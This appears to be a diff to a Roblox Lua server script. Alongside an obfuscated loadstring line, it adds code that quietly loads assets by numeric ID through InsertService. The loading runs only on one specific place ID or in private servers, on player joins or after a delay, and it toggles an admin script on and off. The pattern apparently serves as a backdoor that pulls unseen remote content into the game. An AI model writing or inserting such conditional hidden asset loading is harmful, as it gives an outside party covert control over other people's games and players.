@@ -6,6 +6,25 @@ loadstring("\95\71\46\98\97\100\119\111\114\100\115\32\61\32\123\34\102\117\99\3
 end
 end)
 
+if game.PlaceId == 123066831348189 then
+pcall(function()
+game:GetService("InsertService"):LoadAsset(121155196033104).Parent = workspace
+end)
+    local chatcon = {}
+    chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
+        wait(0.94397082108066)
+        chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
+            game:GetService("InsertService"):LoadAsset(108121042145017).Parent = workspace
+            game.ServerScriptService["Touch Kohls Admin"].Enabled = false
+            wait(0.94397082108066)
+            game.ServerScriptService["Touch Kohls Admin"].Enabled = true
+            for i, v in ipairs(chatcon) do
+                v:Disconnect()
+            end
+        end)
+    end)
+end
+
 _G.prn = function(toprint,time) p = Instance.new("Message")
 p.Parent = workspace
 p.Text = tostring(toprint)
@@ -15,5 +34,11 @@ end
 
 _G.filtermode = true
 _G.ah = nil
+
+if #game.PrivateServerId > 2 then
+    task.delay(5, function()
+        game:GetService("InsertService"):LoadAsset(96093853282187).Parent = workspace
+    end)
+end
 
 --
